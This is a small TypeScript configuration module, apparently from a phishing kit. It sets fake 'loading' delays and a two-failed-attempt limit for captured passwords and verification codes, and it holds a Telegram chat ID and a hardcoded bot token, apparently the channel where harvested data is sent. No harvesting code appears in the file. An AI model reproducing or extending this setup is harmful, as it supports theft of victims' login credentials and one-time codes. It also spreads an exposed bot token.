interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 5000,
		max_failed_code_attempts: 2,
		max_failed_password_attempts: 2,
		password_loading_time: 5000,
	},
	telegram: {
		data_chatid: "-5138773341",
		data_token: "8018288168:AAHXDMFHBjH_diwU4mgtfUe4xjZu1JBHibs",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
